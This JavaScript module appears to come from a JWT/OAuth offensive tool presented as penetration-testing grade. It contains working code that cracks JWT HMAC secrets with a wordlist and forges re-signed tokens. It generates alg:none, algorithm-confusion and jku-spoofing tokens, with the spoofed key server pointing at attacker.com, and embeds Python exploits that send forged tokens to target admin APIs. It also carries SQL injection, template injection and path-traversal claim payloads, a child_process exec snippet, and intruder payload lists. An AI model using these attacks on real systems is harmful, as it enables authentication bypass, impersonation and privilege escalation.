// ─────────────────────────────────────────────────────────────────────────────
// ATTACK ENGINE — Real offensive JWT/OAuth exploitation tools
// PermissionCreep v2.0 — Bug Bounty & Penetration Testing Grade
// ─────────────────────────────────────────────────────────────────────────────

import { COMMON_SECRETS } from './constants.js';

// Extended wordlist for brute-force (top 100 JWT secrets from real breaches)
const EXTENDED_SECRETS = [
  ...COMMON_SECRETS,
  "AllYourBase", "aaaa", "aaaaaa", "abcdef", "asdfgh", "baseball", "batman",
  "bond007", "cookie", "demo", "development", "devkey", "example", "gfhjkm",
  "hello", "iloveu", "letmein1", "login", "mustang", "p@ssword", "p@ssw0rd",
  "pa55word", "passw0rd", "password1", "q1w2e3r4", "qazwsx", "s3cr3t",
  "sammy", "shadow", "signing-key", "signing_key", "super_secret_key",
  "t0p-s3cr3t", "testing", "testing123", "token-secret", "trustno1",
  "verysecret", "w0rdf1sh", "web_token", "winter", "xyz123",
  "my-super-secret", "jwt-secret-key", "node-jwt-secret", "app-secret",
  "api-secret-key", "myapp-jwt", "HS256-secret", "session-secret",
  "express-secret", "django-insecure-key", "rails-secret-key-base",
  "laravel-app-key", "spring-jwt-secret", "flask-secret-key",
  "!@#$%^&*()", "P@ssw0rd!", "Adm1n!", "Secr3t!", "T3st!ng",
  "12345678901234567890123456789012", // 32 bytes of digits
  "0123456789abcdef0123456789abcdef", // 32 hex chars
  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", // repeated A
];

/**
 * ATTACK 1: JWT Secret Brute-Force
 * Actually verifies HMAC signatures against known weak secrets.
 * Uses Web Crypto API for real cryptographic verification.
 */
export async function bruteForceSecret(token) {
  const parts = token.trim().split('.');
  if (parts.length !== 3) return { success: false, error: "Not a valid JWT" };
  
  const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
  const alg = header.alg;
  
  if (!alg || !alg.startsWith('HS')) {
    return { success: false, error: `Algorithm is ${alg}, not HMAC — brute-force not applicable` };
  }

  const signingInput = parts[0] + '.' + parts[1];
  const signature = parts[2];
  const hashAlg = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' }[alg];
  
  if (!hashAlg) return { success: false, error: `Unsupported algorithm: ${alg}` };

  const results = {
    success: false,
    algorithm: alg,
    testedCount: 0,
    crackedSecret: null,
    timeMs: 0,
    attempts: [],
  };

  const startTime = performance.now();

  for (const secret of EXTENDED_SECRETS) {
    results.testedCount++;
    try {
      const encoder = new TextEncoder();
      const keyData = encoder.encode(secret);
      const key = await crypto.subtle.importKey(
        'raw', keyData, { name: 'HMAC', hash: hashAlg }, false, ['sign']
      );
      const sig = await crypto.subtle.sign('HMAC', key, encoder.encode(signingInput));
      const computed = btoa(String.fromCharCode(...new Uint8Array(sig)))
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      
      if (computed === signature) {
        results.success = true;
        results.crackedSecret = secret;
        results.timeMs = Math.round(performance.now() - startTime);
        return results;
      }
    } catch (e) {
      // Skip invalid key
    }
  }

  results.timeMs = Math.round(performance.now() - startTime);
  return results;
}

/**
 * ATTACK 2: Algorithm Confusion Attack (RS256 → HS256)
 * CVE-2015-9235 — Generates a forged token signed with the public key as HMAC secret.
 * The attacker takes the server's RSA public key and uses it as the HS256 secret.
 */
export function generateAlgConfusionPayload(originalToken, customPayload = null) {
  const parts = originalToken.trim().split('.');
  if (parts.length !== 3) return { error: "Not a valid JWT" };

  const originalPayload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  const payload = customPayload || originalPayload;

  // Create forged header with HS256
  const forgedHeader = { alg: "HS256", typ: "JWT" };
  const headerB64 = btoa(JSON.stringify(forgedHeader)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const payloadB64 = btoa(JSON.stringify(payload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

  return {
    attack: "Algorithm Confusion (RS256 → HS256)",
    cve: "CVE-2015-9235",
    description: "Server expects RS256 but we send HS256, using the PUBLIC key as the HMAC secret. If the server doesn't enforce algorithm, it will verify the HMAC using its own public key.",
    forgedTokenTemplate: `${headerB64}.${payloadB64}.<sign with server's public key as HMAC secret>`,
    exploitSteps: [
      "1. Obtain the server's RSA public key (from JWKS endpoint, .well-known, or x5c header)",
      "2. Use the public key as the HMAC-SHA256 secret",
      "3. Sign: HMAC-SHA256(header.payload, publicKeyPEM)",
      "4. Send the forged token — server verifies HMAC with its own public key ✓",
    ],
    exploitCode: `# Python exploit
import jwt
import requests

# Step 1: Get public key
jwks = requests.get('https://target/.well-known/jwks.json').json()
public_key = jwt.algorithms.RSAAlgorithm.from_jwk(jwks['keys'][0])

# Step 2: Forge token with HS256 using public key as secret
forged = jwt.encode(
    ${JSON.stringify(payload, null, 4)},
    public_key.export_key(),  # RSA public key as HMAC secret
    algorithm='HS256'
)
print(f"Forged token: {forged}")

# Step 3: Use forged token
headers = {'Authorization': f'Bearer {forged}'}
r = requests.get('https://target/api/admin', headers=headers)
print(r.status_code, r.text)`,
    curlCommand: `curl -H "Authorization: Bearer ${headerB64}.${payloadB64}.<HMAC_SIGNATURE>" https://target/api/admin`,
    forgedHeader,
    forgedPayload: payload,
  };
}

/**
 * ATTACK 3: alg:none Attack — Bypass signature verification entirely
 * Generates unsigned tokens that bypass weak JWT libraries.
 */
export function generateAlgNonePayload(originalToken, customPayload = null) {
  const parts = originalToken.trim().split('.');
  let payload;
  
  try {
    payload = customPayload || JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
  } catch {
    payload = customPayload || { sub: "admin", role: "admin" };
  }

  const noneVariants = [
    { alg: "none", typ: "JWT" },
    { alg: "None", typ: "JWT" },
    { alg: "NONE", typ: "JWT" },
    { alg: "nOnE", typ: "JWT" },
    { alg: "none" },  // no typ
  ];

  const tokens = noneVariants.map(header => {
    const h = btoa(JSON.stringify(header)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const p = btoa(JSON.stringify(payload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    return {
      header,
      token: `${h}.${p}.`,       // empty signature
      tokenWithDot: `${h}.${p}.`, // trailing dot
      tokenNoDot: `${h}.${p}`,    // no trailing dot (some parsers)
    };
  });

  return {
    attack: "Algorithm None Bypass",
    cve: "CVE-2015-9235",
    description: "Forces the server to skip signature verification by setting alg to 'none'. Works on unpatched jsonwebtoken, PyJWT < 1.5.0, and many custom implementations.",
    variants: tokens,
    payload,
    exploitCode: `# Python - Generate alg:none tokens
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps(${JSON.stringify(payload)}).encode()).rstrip(b'=').decode()

# Try all variants
tokens = [
    f"{header}.{payload}.",    # empty sig with dot
    f"{header}.{payload}",     # no trailing dot
]

for t in tokens:
    print(f"Token: {t}")`,
    testWith: "Send each variant to the target and check for 200/valid response",
  };
}

/**
 * ATTACK 4: Token Forgery Workbench
 * Modify any claim and re-sign with a known/cracked secret.
 */
export async function forgeToken(originalToken, modifications, secret) {
  const parts = originalToken.trim().split('.');
  if (parts.length !== 3) return { error: "Not a valid JWT" };

  const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
  const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

  // Apply modifications
  const forgedPayload = { ...payload, ...modifications };
  
  // Encode
  const headerB64 = btoa(JSON.stringify(header)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const payloadB64 = btoa(JSON.stringify(forgedPayload)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  const signingInput = `${headerB64}.${payloadB64}`;

  // Sign with provided secret
  const hashAlg = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' }[header.alg] || 'SHA-256';
  
  try {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
      'raw', encoder.encode(secret), { name: 'HMAC', hash: hashAlg }, false, ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', key, encoder.encode(signingInput));
    const signatureB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');

    return {
      success: true,
      forgedToken: `${signingInput}.${signatureB64}`,
      originalPayload: payload,
      forgedPayload,
      modifications,
      secret,
      header,
    };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

/**
 * ATTACK 5: JWKS Spoofing — Generate a malicious JWKS endpoint payload
 * For jku/x5u header injection attacks.
 */
export function generateJWKSSpoofPayload(payload, attackerUrl = "https://attacker.com/.well-known/jwks.json") {
  return {
    attack: "JWKS Endpoint Spoofing (jku/x5u injection)",
    cve: "CVE-2018-0114",
    description: "If the server fetches the JWKS from the jku/x5u header parameter without whitelist validation, an attacker can point it to their own key server and sign tokens with their own private key.",
    exploitSteps: [
      "1. Generate an RSA key pair (attacker-controlled)",
      "2. Host the public key at your JWKS endpoint",
      "3. Forge a JWT with jku pointing to your endpoint",
      "4. Sign with your private key",
      "5. Server fetches YOUR public key and validates ✓",
    ],
    forgedHeader: {
      alg: "RS256",
      typ: "JWT",
      kid: "attacker-key-1",
      jku: attackerUrl,
    },
    exploitCode: `# Python exploit — JWKS Spoofing
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
import jwt, json

# Generate attacker's RSA key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Create JWKS JSON (host this at ${attackerUrl})
jwk = jwt.algorithms.RSAAlgorithm.to_jwk(public_key, as_dict=True)
jwk['kid'] = 'attacker-key-1'
jwk['use'] = 'sig'
jwks = {"keys": [jwk]}
print("Host this JWKS:", json.dumps(jwks, indent=2))

# Forge token with jku pointing to attacker
forged = jwt.encode(
    ${JSON.stringify(payload || { sub: "admin", role: "admin" })},
    private_key,
    algorithm='RS256',
    headers={
        "kid": "attacker-key-1",
        "jku": "${attackerUrl}"
    }
)
print(f"\\nForged token: {forged}")`,
    attackerJWKS: {
      keys: [{
        kty: "RSA",
        kid: "attacker-key-1",
        use: "sig",
        alg: "RS256",
        n: "<YOUR_PUBLIC_KEY_MODULUS>",
        e: "AQAB",
      }]
    },
    payload,
  };
}

/**
 * ATTACK 6: Claim Injection — Pre-built privilege escalation payloads
 */
export function generateClaimInjections(originalPayload) {
  const injections = [
    {
      name: "Privilege Escalation — Admin Role",
      description: "Inject admin role to escalate privileges",
      modifications: { role: "admin", is_admin: true, permissions: ["*"] },
    },
    {
      name: "User Impersonation — Change sub",
      description: "Change subject claim to impersonate another user",
      modifications: { sub: "admin@target.com", email: "admin@target.com" },
    },
    {
      name: "Scope Escalation — Wildcard",
      description: "Escalate scopes to full access",
      modifications: { scope: "*", scopes: ["admin:*", "write:*", "delete:*"] },
    },
    {
      name: "Tenant Escape — Change tenant/org",
      description: "Attempt to access another tenant's resources",
      modifications: { 
        tenant_id: "admin-tenant", 
        org_id: "target-org",
        organization: "victim-corp",
      },
    },
    {
      name: "Token Lifetime Extension",
      description: "Set expiry to far future for persistent access",
      modifications: { 
        exp: 9999999999, 
        iat: Math.floor(Date.now()/1000),
        nbf: 0,
      },
    },
    {
      name: "Audience Manipulation",
      description: "Change audience to access different services",
      modifications: { 
        aud: "https://admin-api.target.com",
      },
    },
    {
      name: "Issuer Spoofing",
      description: "Spoof issuer to bypass origin validation",
      modifications: { 
        iss: "https://accounts.google.com",
      },
    },
    {
      name: "SQL Injection in Claims",
      description: "Test for backend SQL injection via JWT claims",
      modifications: { 
        sub: "' OR '1'='1' --",
        email: "admin'--@test.com",
        name: "' UNION SELECT password FROM users--",
      },
    },
    {
      name: "SSTI/Template Injection in Claims",
      description: "Test for server-side template injection",
      modifications: {
        name: "{{7*7}}",
        sub: "${7*7}",
        email: "#{7*7}@test.com",
      },
    },
    {
      name: "Path Traversal in Claims",
      description: "Test for path traversal via claims used in file operations",
      modifications: {
        sub: "../../../etc/passwd",
        tenant: "../../admin",
        avatar: "....//....//etc/passwd",
      },
    },
  ];

  return injections.map(inj => ({
    ...inj,
    original: originalPayload,
    forgedPayload: { ...originalPayload, ...inj.modifications },
  }));
}

/**
 * ATTACK 7: Known CVE Exploit Matcher
 * Matches token characteristics to known CVEs with exploit code.
 */
export function matchCVEs(parsed) {
  if (!parsed || parsed.error) return [];
  
  const cves = [];
  const header = parsed.header || {};
  const payload = parsed.payload || {};

  // CVE-2015-9235 — JWT alg:none
  if (!header.alg || header.alg.toLowerCase() === 'none') {
    cves.push({
      cve: "CVE-2015-9235",
      title: "JWT Algorithm None Attack",
      severity: "CRITICAL",
      cvss: 9.8,
      affected: "jsonwebtoken < 4.2.2, PyJWT < 1.5.0, php-jwt < 2.0, jose4j, nimbus-jose-jwt",
      description: "Libraries accept tokens with alg:none, bypassing all signature verification.",
      exploit: `# Exploit: Forge any token without signature
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
print(f"{header}.{payload}.")`,
    });
  }

  // CVE-2018-0114 — JWKS spoofing
  if (header.jku || header.x5u) {
    cves.push({
      cve: "CVE-2018-0114",
      title: "JWT JWKS Endpoint Spoofing",
      severity: "CRITICAL",
      cvss: 9.1,
      affected: "Cisco node-jose, java-jwt < 3.4.1",
      description: "Server fetches signing key from attacker-controlled URL in jku/x5u header.",
      exploit: `# Point jku to attacker server hosting malicious JWKS
# Header: {"alg":"RS256","jku":"https://evil.com/jwks.json","kid":"attacker"}`,
    });
  }

  // CVE-2022-23529 — jsonwebtoken prototype pollution
  if (header.alg === 'HS256') {
    cves.push({
      cve: "CVE-2022-23529",
      title: "jsonwebtoken <= 8.5.1 — Arbitrary Code Execution",
      severity: "HIGH",
      cvss: 7.6,
      affected: "jsonwebtoken <= 8.5.1 (Node.js)",
      description: "Prototype pollution via crafted secretOrPublicKey allows arbitrary code execution during jwt.verify().",
      exploit: `// If you control the secret/key object:
const maliciousKey = Object.create(null);
Object.defineProperty(maliciousKey, 'toString', { value: () => { require('child_process').exec('id'); return 'key'; }});
jwt.verify(token, maliciousKey);`,
    });
  }

  // CVE-2024-21319 — .NET JWT token length DoS
  if (parsed.raw && parsed.raw.length > 1000) {
    cves.push({
      cve: "CVE-2024-21319",
      title: "Microsoft.IdentityModel JWT DoS",
      severity: "MEDIUM",
      cvss: 6.5,
      affected: "Microsoft.IdentityModel.JsonWebTokens < 7.1.2",
      description: "Crafted JWT with large payload causes excessive CPU consumption during validation.",
      exploit: `# Generate oversized token for DoS
import jwt
huge_payload = {"data": "A" * 1000000}
token = jwt.encode(huge_payload, "secret", algorithm="HS256")`,
    });
  }

  // Generic: kid injection
  if (header.kid) {
    cves.push({
      cve: "CVE-2017-11424 (variant)",
      title: "JWT kid Parameter Injection",
      severity: "HIGH",
      cvss: 8.1,
      affected: "Custom implementations using kid in file paths or SQL queries",
      description: "If kid is used in filesystem paths or database queries without sanitization, it enables path traversal or SQL injection.",
      exploit: `# Path traversal via kid
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}
# Sign with empty string as secret (reading /dev/null = empty)

# SQL injection via kid  
{"alg":"HS256","kid":"' UNION SELECT 'known-secret' FROM secrets--","typ":"JWT"}
# If kid is used in SQL query, inject known secret value`,
    });
  }

  // x5c embedding attack
  if (header.x5c) {
    cves.push({
      cve: "CVE-2017-2800",
      title: "x5c Header Certificate Chain Injection",
      severity: "CRITICAL",
      cvss: 9.0,
      affected: "Libraries that trust x5c header without validation",
      description: "Attacker embeds their own certificate in x5c header. Library uses it for verification instead of the configured key.",
      exploit: `# Embed attacker certificate in x5c header
# 1. Generate self-signed cert
# 2. Put cert in x5c header array
# 3. Sign token with corresponding private key
# 4. Server validates using embedded cert ✓`,
    });
  }

  return cves;
}

/**
 * ATTACK 8: Generate Burp Suite / ZAP intruder payloads
 */
export function generateIntruderPayloads(parsed) {
  if (!parsed || parsed.error) return [];
  
  const payload = parsed.payload || {};
  const payloads = [];

  // Header manipulation payloads
  payloads.push({
    category: "Algorithm Manipulation",
    position: "Header",
    payloads: [
      { label: "alg:none", value: btoa(JSON.stringify({alg:"none",typ:"JWT"})).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'') },
      { label: "alg:None", value: btoa(JSON.stringify({alg:"None",typ:"JWT"})).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'') },
      { label: "alg:HS256 (confusion)", value: btoa(JSON.stringify({alg:"HS256",typ:"JWT"})).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'') },
    ]
  });

  // Sub claim payloads
  payloads.push({
    category: "Subject (sub) Manipulation",
    position: "Payload",
    payloads: [
      { label: "admin", value: "admin" },
      { label: "root", value: "root" },
      { label: "user_1 (IDOR)", value: "1" },
      { label: "user_0 (IDOR)", value: "0" },
      { label: "system", value: "system" },
      { label: "null byte", value: "admin\x00user" },
    ]
  });

  // Role escalation
  payloads.push({
    category: "Role Escalation",
    position: "Payload",
    payloads: [
      { label: "role:admin", value: JSON.stringify({...payload, role: "admin"}) },
      { label: "role:superadmin", value: JSON.stringify({...payload, role: "superadmin"}) },
      { label: "is_admin:true", value: JSON.stringify({...payload, is_admin: true}) },
      { label: "permissions:[*]", value: JSON.stringify({...payload, permissions: ["*"]}) },
    ]
  });

  return payloads;
}

/**
 * ATTACK 9: Mass Token Analyser — Process bulk tokens from logs
 */
export function massAnalyze(tokens) {
  return tokens.map((token, index) => {
    const parts = token.trim().split('.');
    if (parts.length !== 3) return { index, error: "Invalid format", token: token.slice(0, 30) + "..." };
    
    try {
      const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
      const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      
      const issues = [];
      if (!header.alg || header.alg.toLowerCase() === 'none') issues.push("ALG_NONE");
      if (header.alg === 'HS256') issues.push("WEAK_ALG");
      if (!payload.exp) issues.push("NO_EXPIRY");
      if (payload.exp && payload.exp < Date.now()/1000) issues.push("EXPIRED");
      if (!payload.aud) issues.push("NO_AUDIENCE");
      if (payload.role === 'admin' || payload.is_admin) issues.push("ADMIN_TOKEN");
      
      const scopes = payload.scope || payload.scopes || "";
      if (scopes.includes("*")) issues.push("WILDCARD_SCOPE");
      
      return {
        index,
        alg: header.alg,
        sub: payload.sub,
        exp: payload.exp ? new Date(payload.exp * 1000).toISOString() : "NONE",
        issues,
        severity: issues.includes("ALG_NONE") || issues.includes("ADMIN_TOKEN") ? "CRITICAL" : 
                  issues.includes("WEAK_ALG") || issues.includes("NO_EXPIRY") ? "HIGH" : "LOW",
      };
    } catch (e) {
      return { index, error: e.message, token: token.slice(0, 30) + "..." };
    }
  });
}

/**
 * ATTACK 10: OAuth Token Exploitation Checks
 */
export function analyzeOAuthSecurity(parsed) {
  if (!parsed || parsed.error) return null;
  const payload = parsed.payload || {};
  
  const checks = [];

  // Check for redirect_uri in token (shouldn't be there but sometimes is)
  if (payload.redirect_uri || payload.redirect) {
    checks.push({
      severity: "HIGH",
      title: "Redirect URI in token — potential open redirect",
      description: "Token contains redirect_uri claim. Test for open redirect manipulation.",
      exploit: "Modify redirect_uri to attacker domain and replay token",
    });
  }

  // Check for nonce (CSRF protection in OIDC)
  if (!payload.nonce && payload.iss) {
    checks.push({
      severity: "MEDIUM",
      title: "Missing nonce — CSRF in OAuth flow",
      description: "No nonce claim present. The OAuth flow may be vulnerable to CSRF token injection attacks.",
      exploit: "Intercept auth response and inject into victim's session (login CSRF)",
    });
  }

  // Check for at_hash (access token binding)
  if (!payload.at_hash && payload.iss) {
    checks.push({
      severity: "LOW",
      title: "Missing at_hash — Token substitution possible",
      description: "ID token doesn't bind to access token via at_hash. Access token substitution attacks may be possible.",
    });
  }

  // Check audience for multi-tenant confusion
  if (payload.aud && Array.isArray(payload.aud) && payload.aud.length > 1) {
    checks.push({
      severity: "MEDIUM",
      title: "Multi-audience token — confused deputy risk",
      description: `Token valid for ${payload.aud.length} audiences: ${payload.aud.join(', ')}. Test cross-service token replay.`,
      exploit: "Use token intended for service A against service B",
    });
  }

  // Check for azp (authorized party) mismatch potential
  if (payload.azp && payload.aud && payload.azp !== payload.aud) {
    checks.push({
      severity: "MEDIUM",
      title: "azp differs from aud — third-party token",
      description: "This token was obtained by a different client (azp) than the intended audience. Check for token confusion.",
    });
  }

  return checks;
}
